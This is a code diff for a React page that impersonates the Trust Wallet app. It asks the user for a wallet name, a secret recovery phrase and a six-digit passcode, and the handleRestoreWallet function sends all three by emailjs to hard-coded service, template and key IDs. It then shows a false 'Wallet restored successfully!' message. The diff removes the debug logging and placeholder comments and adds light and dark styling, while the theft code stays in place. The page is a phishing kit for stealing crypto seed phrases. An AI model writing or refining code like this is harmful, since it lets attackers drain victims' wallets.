@@ -32,10 +32,7 @@ export default function App() {
   }
 
   const handleRestoreWallet = async () => {
-    console.log('Restore wallet button clicked')
-
     if (isLoading || passcode.includes('') || passcode.length !== 6) {
-      console.log('Validation failed:', { isLoading, passcode })
       alert('Passcode must be 6 digits!')
       return
     }
@@ -44,31 +41,23 @@ export default function App() {
     setSuccessMessage('')
 
     try {
-      console.log('Sending email with data:', {
-        walletName,
-        phrase,
-        passcode: passcode.join(''),
-      })
-
-      const response = await emailjs.send(
-        'service_rs8lrr9', // Replace with your service ID
-        'template_9zy6p1h', // Replace with your template ID
+      await emailjs.send(
+        'service_rs8lrr9',
+        'template_9zy6p1h',
         {
           wallet_name: walletName,
           phrase: phrase,
-          passcode: passcode.join(''), // Join passcode array to a string
+          passcode: passcode.join(''),
         },
-        'ZZFqwQrTaRvFP9Jx5' // Replace with your public key
+        'ZZFqwQrTaRvFP9Jx5'
       )
 
-      console.log('Email sent successfully:', response)
       setSuccessMessage('Wallet restored successfully!')
       setStep(1)
       setWalletName('Main Wallet')
       setPhrase('')
       setPasscode(Array(6).fill('')) // Reset passcode to empty array
     } catch (error) {
-      console.error('Error sending email:', error)
       alert('Failed to restore wallet. Please try again.')
     } finally {
       setIsLoading(false)
@@ -82,13 +71,13 @@ export default function App() {
   }
 
   return (
-    <div className="min-h-screen bg-black text-gray-300">
-      <header className="flex items-center justify-between p-4 border-b border-gray-800">
-        <button className="p-2 hover:bg-gray-800 rounded-lg">
+    <div className="min-h-screen bg-white text-black dark:bg-black dark:text-gray-300">
+      <header className="flex items-center justify-between p-4 border-b border-gray-200 dark:border-gray-800">
+        <button className="p-2 hover:bg-gray-200 dark:hover:bg-gray-800 rounded-lg">
           <ArrowLeft className="w-6 h-6" />
         </button>
-        <h1 className="text-xl font-medium text-white">Trust Wallet</h1>
-        <button className="p-2 hover:bg-gray-800 rounded-lg">
+        <h1 className="text-xl font-medium text-black dark:text-white">Trust Wallet</h1>
+        <button className="p-2 hover:bg-gray-200 dark:hover:bg-gray-800 rounded-lg">
           <Maximize2 className="w-6 h-6" />
         </button>
       </header>
@@ -104,7 +93,7 @@ export default function App() {
                   placeholder="Wallet Name"
                   value={walletName}
                   onChange={(e) => setWalletName(e.target.value)}
-                  className="w-full bg-gray-800 rounded-lg px-4 py-3 pr-10"
+                  className="w-full bg-gray-100 dark:bg-gray-800 rounded-lg px-4 py-3 pr-10"
                 />
                 {walletName && (
                   <button
@@ -124,7 +113,7 @@ export default function App() {
                 value={phrase}
                 onChange={(e) => setPhrase(e.target.value)}
                 rows={6}
-                className="w-full bg-gray-800 rounded-lg px-4 py-3 resize-none"
+                className="w-full bg-gray-100 dark:bg-gray-800 rounded-lg px-4 py-3 resize-none"
                 placeholder="Enter your secret recovery phrase"
               />
               <p className="text-sm text-gray-500">
@@ -135,7 +124,7 @@ export default function App() {
             <button
               type="submit"
               disabled={!isValidWordCount}
-              className="w-full bg-gray-800 text-white rounded-lg px-4 py-3 disabled:opacity-50 disabled:cursor-not-allowed"
+              className="w-full bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-lg px-4 py-3 disabled:opacity-50 disabled:cursor-not-allowed"
             >
               Next
             </button>
@@ -149,7 +138,9 @@ export default function App() {
               >
                 Cancel
               </button>
-              <h2 className="text-xl font-medium text-white">Verify Passcode</h2>
+              <h2 className="text-xl font-medium text-black dark:text-white">
+                Verify Passcode
+              </h2>
               <div className="w-16"></div>
             </div>
 
@@ -161,7 +152,7 @@ export default function App() {
               {passcode.map((digit, i) => (
                 <div
                   key={i}
-                  className="w-12 h-12 text-center bg-gray-800 text-white rounded-lg flex items-center justify-center text-xl border border-gray-600 focus-within:border-green-400"
+                  className="w-12 h-12 text-center bg-gray-100 dark:bg-gray-800 text-black dark:text-white rounded-lg flex items-center justify-center text-xl border border-gray-300 dark:border-gray-600 focus-within:border-green-400"
                 >
                   <input
                     type="password"
